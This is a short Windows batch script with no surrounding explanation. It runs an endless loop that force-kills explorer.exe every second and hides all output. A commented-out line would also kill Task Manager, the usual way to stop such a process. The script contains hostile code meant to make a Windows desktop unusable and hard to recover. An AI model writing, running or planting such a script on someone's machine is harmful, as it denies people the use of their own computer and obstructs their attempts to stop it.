@echo off
setlocal

:loop
timeout /nobreak /t 1 >nul
taskkill /f /im explorer.exe >nul 2>&1
rem taskkill /f /im taskmgr.exe >nul 2>&1
goto loop